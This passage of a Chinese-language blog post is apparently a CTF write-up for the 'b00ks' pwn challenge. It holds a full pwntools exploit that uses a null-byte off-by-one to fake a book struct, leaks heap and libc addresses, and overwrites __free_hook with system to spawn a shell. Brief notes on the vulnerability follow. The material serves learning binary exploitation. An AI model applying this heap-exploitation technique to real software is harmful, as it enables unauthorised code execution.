class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process([&apos;./b00ks&apos;],env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so.6&apos;&#125;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def create_book(name_size,name,des_size,des):</span><br><span class="line">	io.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">	io.sendline(&apos;1&apos;)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(name_size)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(name)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(des_size)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(des)</span><br><span class="line"></span><br><span class="line">def delete_book(ID):</span><br><span class="line">#	io.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">	io.sendline(&apos;2&apos;)</span><br><span class="line">	io.recv()</span><br><span class="line">	io.sendline(ID)</span><br><span class="line"></span><br><span class="line">def edit_book(ID,des):	</span><br><span class="line">#	io.recv()</span><br><span class="line">	io.sendline(&apos;3&apos;)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(ID)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(des)</span><br><span class="line"></span><br><span class="line">def print_book():</span><br><span class="line">	io.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">	io.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def change_name(aut_name):</span><br><span class="line">	io.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">	io.sendline(&apos;5&apos;)</span><br><span class="line">	io.recvuntil(&apos;: &apos;)</span><br><span class="line">	io.sendline(aut_name)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&apos;Enter author name: &apos;)</span><br><span class="line">io.sendline(&apos;A&apos;*32)</span><br><span class="line"></span><br><span class="line">create_book(&apos;128&apos;,&apos;A&apos;,&apos;128&apos;,&apos;B&apos;)</span><br><span class="line">create_book(str(0x21000),&apos;C&apos;,str(0x21000),&apos;D&apos;)</span><br><span class="line"></span><br><span class="line">#leak book1_struct_addr</span><br><span class="line">print_book()</span><br><span class="line">sh = io.recv()</span><br><span class="line">book1_addr = u64(sh[69:69+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">log.success(&quot;book1_address:&quot; + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">#fake_book1_struct</span><br><span class="line">payload = &apos;A&apos;*16*5 + p64(1) + p64(book1_addr+0x30+0x8) + p64(book1_addr+0x30+0x8) + p64(0xffff)</span><br><span class="line">edit_book(&apos;1&apos;,payload)</span><br><span class="line"></span><br><span class="line">#fake_book1_struct_addr</span><br><span class="line">change_name(&apos;a&apos;*32)</span><br><span class="line"></span><br><span class="line">#leak book2_name_addr</span><br><span class="line">print_book()</span><br><span class="line">sh = io.recv()</span><br><span class="line">book2_name_addr =  u64(sh[12:18].ljust(8,&apos;\x00&apos;))</span><br><span class="line">log.success(&quot;book2_name_addr:&quot; + hex(book2_name_addr))</span><br><span class="line"></span><br><span class="line">#libcbase</span><br><span class="line">offset = 0x7f69e1992000 - 0x7f69e13ea000</span><br><span class="line">mmap = book2_name_addr - 0x22010</span><br><span class="line">libcbase = mmap - offset</span><br><span class="line">log.success(&quot;libcbase:&quot; + hex(libcbase))</span><br><span class="line">#other function addr</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;] + libcbase</span><br><span class="line">binsh_addr = libc.search(&apos;/bin/sh&apos;).next() + libcbase</span><br><span class="line">free_hook = libc.symbols[&apos;__free_hook&apos;] + libcbase</span><br><span class="line"></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(&apos;1&apos;,payload)</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit_book(&apos;2&apos;,payload)</span><br><span class="line">delete_book(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>啊，弄完了，开心 ٩(๑&gt;◡&lt;๑)۶ </p>
+<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p>几个点要注意一下   </p>
+<ul>
+<li>my_read函数存在null byte off-by-one漏洞</li>
+<li>泄漏book1_struct的地址，内存布局，刚好能覆盖那个\x00</li>
+<li>应该在哪儿伪造fake_book1_struct，\x00覆盖book1_struct地址的最低一个字节，确保落在book1_description里</li>
+<li>mmap与libc有固定偏移</li>
+<li>触发条件，__free_hook里面的内容不为NULL，从而执行指向的指令</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/21/Start/" rel="next" title="pwnable.tw之Start">
+                <i class="fa fa-chevron-left"></i> pwnable.tw之Start
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2999/12/31/diary/" rel="prev" title="备忘">
+                备忘 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ha2</p>
+              <p class="site-description motion-element" itemprop="description">什么都可以不会，但不能学不会。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01一个图书管理"><span class="nav-number">1.</span> <span class="nav-text">0x01一个图书管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序漏洞"><span class="nav-number">2.</span> <span class="nav-text">程序漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-泄漏book1-struct的地址。"><span class="nav-number">3.</span> <span class="nav-text">0x01:泄漏book1_struct的地址。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mmap"><span class="nav-number">4.</span> <span class="nav-text">[mmap]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-构造fake-book1-0字节覆盖"><span class="nav-number">5.</span> <span class="nav-text">0x03:构造fake_book1  + 0字节覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-leak-book2-name的地址（mmap的区域）"><span class="nav-number">6.</span> <span class="nav-text">0x04:leak book2_name的地址（mmap的区域）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-触发"><span class="nav-number">7.</span> <span class="nav-text">0x05 触发</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、设置-free-hook里为system的地址"><span class="nav-number">7.0.1.</span> <span class="nav-text">1、设置__free_hook里为system的地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06完整exp"><span class="nav-number">8.</span> <span class="nav-text">0x06完整exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07"><span class="nav-number">9.</span> <span class="nav-text">0x07</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha2</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
